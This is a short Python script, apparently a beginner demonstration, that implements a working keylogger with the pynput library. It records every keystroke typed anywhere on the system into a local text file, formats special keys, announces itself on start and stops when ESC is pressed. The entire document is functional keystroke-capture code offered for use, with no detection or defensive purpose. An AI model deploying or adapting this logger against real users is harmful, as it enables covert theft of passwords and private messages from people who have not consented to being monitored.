from pynput.keyboard import Key, Listener

# We will save this to a new, clean text file
log_file = "clean_log.txt"

def on_press(key):
    # Open the file in 'append' mode ("a") so we don't overwrite previous keys
    with open(log_file, "a") as f:
        try:
            # If it's a normal character, write it exactly as is (no new lines)
            f.write(key.char)
        except AttributeError:
            # Handle the special keys to make it readable
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                # For things like Shift, Ctrl, etc., put them in brackets
                f.write(f" [{key}] ")

def on_release(key):
    if key == Key.esc:
        print("\n[*] Exiting Keylogger...")
        return False

print("[*] Clean Keylogger started. Type a few sentences anywhere!")
print("[*] Press 'ESC' to stop logging.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()